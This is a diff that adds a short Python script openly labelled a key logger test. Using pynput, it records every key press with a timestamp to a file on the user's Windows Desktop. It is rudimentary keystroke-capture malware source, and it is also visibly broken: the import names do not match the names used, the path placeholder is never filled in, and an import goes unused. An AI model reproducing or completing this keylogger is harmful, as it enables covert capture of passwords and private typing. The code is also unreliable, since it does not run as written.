@@ -1,0 +1,17 @@
+###Key Logger Test  (simple) test 0.01###
+
+from pynput.keyboard import listener
+import OS
+import logging
+from shutil import copyfile
+
+username = os.getlogin()
+logging_directory = "C:/users/{username}/Desktop" #Will save on Desktop, from user found out in line 8
+
+logging.basicConfig(filename=f"{logging_directory}/keyLogged.txt",level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+def key_handler(key):
+    logging.info(key)
+
+with Listener(on_press=key_handler) as Listener:
+    listener.join()
